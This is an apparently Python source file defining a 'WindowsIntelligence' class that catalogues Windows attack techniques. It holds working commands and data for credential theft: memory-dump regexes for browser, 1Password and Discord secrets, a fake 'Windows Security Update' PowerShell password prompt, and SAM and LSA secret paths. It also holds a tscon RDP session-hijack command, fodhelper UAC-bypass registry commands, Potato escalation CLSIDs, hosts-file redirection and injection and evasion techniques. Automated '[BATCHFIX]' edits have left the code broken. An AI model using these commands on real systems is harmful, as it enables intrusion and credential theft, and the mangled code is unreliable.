#!/usr/bin/env python3
# Copyright 2026 PyAgent Authors
# Licensed under the Apache License, Version 2.0 (the "License")
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

try:
    from typing import List, Dict, Any
"""
except ImportError:

"""
from typing import List, Dict, Any




class WindowsIntelligence:
# [BATCHFIX] Commented metadata/non-Python
#     pass  # [BATCHFIX] inserted for empty class
""""
Intelligence engine for Windows-specific enumeration and discovery.#     @staticmethod
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python"""
# [BATCHFIX] Commented metadata/non-Python
"""
def get_osquery_enumeration_queries() -> Dict[str, str]:"A collection of high-value OSQuery queries for Windows discovery.        return {
            "os_version": "SELECT * FROM os_version;","            "patches": "SELECT * FROM patches;","# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string"""
#             "drivers": "SELECT device_name, image FROM drivers WHERE image != ";","  # [BATCHFIX] closed string"            "groups": "SELECT groupname, group_sid FROM groups;","            "logged_in_users": "SELECT type, user, host, pid FROM logged_in_users;","            "logon_sessions": "SELECT user, logon_domain, authentication_package FROM logon_sessions;","            "ntdomains": "SELECT * FROM ntdomains;","            "pipes": "SELECT * FROM pipes;","            "scheduled_tasks": "SELECT name, action, path FROM scheduled_tasks;","            "services": "SELECT name, display_name, start_type, status FROM services;","# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis"""
#             "process_connections": ("# [BATCHFIX] Commented metadata/non-Python
"""                 "SELECT p.name, p.path, pos.local_address, pos.remote_address"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
"""                 "FROM processes p JOIN process_open_sockets pos USING (pid);"  # [BATCHFIX] closed string"            ),
        }

    @staticmethod
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python"""
# [BATCHFIX] Commented metadata/non-Python
"""
def get_common_windows_persistence_locations() -> List[str]:"Registry keys and paths commonly used for persistence.        return [
# [BATCHFIX] Commented metadata/non-Python
#             rHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run","  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
#             rHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
#             rHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce","  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
#             rHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce","  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
#             rC:\\Users\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup","  # [BATCHFIX] closed string"        ]

    @staticmethod
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python"""
# [BATCHFIX] Commented metadata/non-Python
"""
def get_memory_credential_artifacts() -> Dict[str, Dict[str, Any]]:"Registry of regex patterns for finding credentials in process memory dumps.# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string"""
#        " return {"  # [BATCHFIX] closed string"            "firefox": {"                "process": "firefox.exe","# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python"""
# [BATCHFIX] Commented metadata/non-Python
"""                 "patterns": [rpassword[\"']\\\\s*:\\\\s*[\"']([^\"']+)[\"']", rusername[\"']\\\\s*:\\\\s*[\"']([^\"']+)[\"']"],"'            },
            "chrome": {"                "process": "chrome.exe","# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python"""
# [BATCHFIX] Commented metadata/non-Python
"""                 "patterns": [r"\"password_element\"\\\\s*:\\\\s*\"([^\"]+)\", r"\"username_element\"\\\\s*:\\\\s*\"([^\"]+)\"],"            },
            "1password": {"                "process": "1Password.exe","# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python"""
# [BATCHFIX] Commented metadata/non-Python
"""                 "patterns": [rmaster_password\\\\s*[:=]\\\\s*(\\w+)", rvault_key\\\\s*[:=]\\\\s*(\\w+)"],"            },
            "ssh_private_key": {"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python"""
# [BATCHFIX] Commented metadata/non-Python
"""                 "patterns": [r"-----BEGIN [A-Z ]+ PRIVATE KEY-----[\\\\s\\S]+?-----END [A-Z ]+ PRIVATE KEY-----"]"            },
        }

    @staticmethod
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python"""
# [BATCHFIX] Commented metadata/non-Python
"""
def get_evasive_api_hashing_gadgets() -> Dict[str, Any]:"Techniques for resolving APIs via hashing to evade static analysis (Ported from GhostStrike).# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string"""
#     "    return {"  # [BATCHFIX] closed string"            "hash_algorithm": "hash = (hash >> 13) | (hash << 19); hash += *str++;","            "seed": 0,"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python"""
# [BATCHFIX] Commented metadata/non-Python
"""             "target_dlls": ["kernel32.dll", "advapi32.dll", "user32.dll", "ntdll.dll"],"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis"""
#             "resolution_method": ("# [BATCHFIX] Commented metadata/non-Python
"""                 "Walking PE export directory and comparing name hashes instead of using GetProcAddress"  # [BATCHFIX] closed string"            ),
        }

    @staticmethod
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python"""
# [BATCHFIX] Commented metadata/non-Python
"""
def get_stealthy_registry_persistence() -> Dict[str, str]:"Registry-only scheduled task creation for stealth (Ported from GhostTask).# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string"""
#  "       return {"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string"""
#             "task_cache_path": rHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks","  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string"""
#             "task_tree_path": rHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree","  # [BATCHFIX] closed string"            "requirements": "Requires SeRestorePrivilege and a restart of the 'Schedule' service (gpsvc)","'            "detection": "Mismatched timestamps or missing SD (Security Descriptor) values in the TaskCache registry","        }

    @staticmethod
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python"""
# [BATCHFIX] Commented metadata/non-Python
"""
def get_potato_exploit_guids() -> Dict[str, str]:"Known CLSIDs used for Potato-style privilege escalation (SeImpersonate).        return {
            "PrintNotify": "{854A20FB-2D44-457D-992F-EF13785D2B51}","            "WUAUServ": "{e30629d1-150e-4433-a359-d23983fd20ae}","            "Ipsessvc": "{A47979D2-C419-11D9-A5B4-001185AD2B89}","            "BITS": "{4991d34b-80a1-4291-83b6-3328366b9097}","        }

    @staticmethod
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python"""
# [BATCHFIX] Commented metadata/non-Python
"""
def get_session_hijacking_artifacts() -> List[str]:"Files and registry keys for hijacking user sessions".        return [
# [BATCHFIX] Commented metadata/non-Python
#             rC:\\Windows\\System32\\\\config\\SAM","  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
#             rC:\\Windows\\System32\\\\config\\SYSTEM","  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
#             rHKLM\\SECURITY\\Policy\\Secrets","  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
#             rC:\\Users\%USERNAME%\\AppData\\Local\\Microsoft\\Credentials","  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
#             rC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\\\machine.config","  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
#             rC:\\Users\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations","  # [BATCHFIX] closed string"        ]

    @staticmethod
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python"""
# [BATCHFIX] Commented metadata/non-Python
"""
def get_file_analysis_indicators() -> Dict[str, str]:"Analysis indicators for newly created/modified files (Ported from FileWatchTower).        return {
            "web_motw_check": "Checking Zone.Identifier alternate data stream for ZoneID=3 (Internet)","            "imphash_calculation": "Import Hash to identify binary cousins via API usage patterns","            "ssdeep_fuzzy_hash": "Context-triggered piecewise hashes for similarity detection","            "cert_revocation_status": "Verifying if signing certificate has been revoked via CRL/OCSP","            "authenticode_chain_validity": "Full chain validation for signed binaries","# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis"""
#             "interesting_strings_discovery": ("# [BATCHFIX] Commented metadata/non-Python
"""                 "Searching for compiler markers (Go, Rust), debug paths, and project names"  # [BATCHFIX] closed string"            ),
            "entropy_high_threshold": "Entropy > 7.2 often indicates XOR/AES payload within a section","        }

    @staticmethod
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python"""
# [BATCHFIX] Commented metadata/non-Python
"""
def get_post_exploit_gadgets() -> Dict[str, str]:"Post-Exploitation Primitives (Ported from 0xSojalSec-femboyaccess).        return {
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis"""
#             "critical_process_enable": ("# [BATCHFIX] Commented metadata/non-Python
"""                 "ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()));"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
"""                 "ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)"  # [BATCHFIX] closed string"            ),
            "critical_process_disable": "ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)","# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis"""
#             "credential_phish_ps": ("#                 "$cred=$host.ui.promptforcredential('Windows Security Update',","'# [BATCHFIX] Commented metadata/non-Python
"""                 "[Environment]::UserName,[Environment]::UserDomainName);"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
"""                 "$cred.getnetworkcredential().password"  # [BATCHFIX] closed string"            ),
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis"""
#             "hosts_redirection": ("                'Add-Content -Path C:\\Windows\\System32\\drivers\\etc\\hosts -Value "`n{ip} {domain}"'"'            ),
        }

    @staticmethod
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python"""
# [BATCHFIX] Commented metadata/non-Python
"""
def get_software_artifacts() -> Dict[str, Dict]:"Discovery patterns for specific software (Discord, etc.).        return {
            "discord": {"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string"""
#                 "token_regex": [r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}", rmfa\\.[\\w-]{84}"],"  # [BATCHFIX] closed string"                "local_storage_path": "Local Storage\\leveldb","            }
        }

    @staticmethod
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python"""
# [BATCHFIX] Commented metadata/non-Python
"""
def get_malware_feature_engineering_metrics() -> Dict[str, str]:"Structural PE features used for ML-based malware detection (Ported "from ExeRay).        return {
            "shannon_entropy": "Measure of randomness in data sections (compressed/encrypted data)","            "section_count": "Total number of sections (look for unusual counts like 1 or >10)","            "section_names_entropy": "Unusual section names often indicate packers","            "import_distribution": "Ratio of unique DLLs to total imports","            "string_heuristics": "Average string length and total count (malware often has few/long strings)","            "characteristics": "Flags like IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_DLL","        }

    @staticmethod
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python"""
# [BATCHFIX] Commented metadata/non-Python
"""
def get_rdp_hooking_patterns() -> Dict[str, str]:"Techniques to steal RDP credentials via process hollowing or hooking.        return {
            "mstsc_hook": "Hooking CryptProtectMemory in mstsc.exe","            "rdp_redirection": "Redirecting RDP traffic via registry (fDisableCam), (fDisableCcm)","        }

    @staticmethod
    def get_rdp_hijack_command(session_id: int, target_session_id: int = 0) -> str:
    pass  # [BATCHFIX] inserted for empty block
""""
Generates a command to hijack an RDP session using tscon.# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis"""
#         return (
#             ftscon {session_id} /dest:console
            if target_session_id == 0
#             else ftscon {session_id} /dest:{target_session_id}
        )

    @staticmethod
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python"""
# [BATCHFIX] Commented metadata/non-Python
"""
def get_api_hooking_primitives() -> Dict[str, str]:"Techniques for hooking Windows APIs to intercept calls.        return {
            "iat_hooking": "Modifying the Import Address Table to point to proxy functions.","            "inline_patching": "Replacing function preamble (5-6 bytes) with JMP/PUSH-RET (0x68 ... 0xC3).","            "trampoline": "Copying original bytes to a buffer and jumping back to continue execution.","            "hardware_breakpoints": "Using Debug Registers (DR0-DR7) to trigger hooks without modifying code.","        }

    @staticmethod
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python"""
# [BATCHFIX] Commented metadata/non-Python
"""
def get_syscall_injection_metadata() -> Dict[str, Any]:"Native syscalls (NT*) for stealthy memory operations "bypassing Kernel32 hooks.        return {
            "allocation": "NtAllocateVirtualMemory","            "writing": "NtWriteVirtualMemory","            "execution": "NtCreateThreadEx","            "protection": "NtProtectVirtualMemory","            "unmapping": "NtUnmapViewOfSection","        }

    @staticmethod
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python"""
# [BATCHFIX] Commented metadata/non-Python
"""
def get_process_injection_techniques() -> Dict[str, str]:"Advanced process injection methodologies.        return {
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis"""
#             "threadless_injection": ("# [BATCHFIX] Commented metadata/non-Python
"""                 "Hooking a frequently called export (e.g., AmsiScanBuffer) to trigger shellcode execution."  # [BATCHFIX] closed string"            ),
            "early_bird_apc": ("Queueing an APC to a thread in a suspended state (NtQueueApcThread) before resuming."),"            "module_stomping": "Overwriting an unused DLL in the target process memory with shellcode.","            "process_hollowing": "Starting a suspended process, unmapping its memory, and replacing it with own code.","        }

    @staticmethod
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python"""
# [BATCHFIX] Commented metadata/non-Python
"""
def get_uac_bypass_commands(executable_path: str) -> List[str]:"Commands for UAC bypass via registry hijacking" (fodhelper, computerdefaults).        return [
            f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{executable_path}" /f',"'# [BATCHFIX] Commented metadata/non-Python
#             rreg add hkcu\\Software\\Classes\\\\ms-settings\\\\shell\\open\\\\command /v DelegateExecute /f","  # [BATCHFIX] closed string"            "fodhelper.exe","            "computerdefaults.exe","        ]
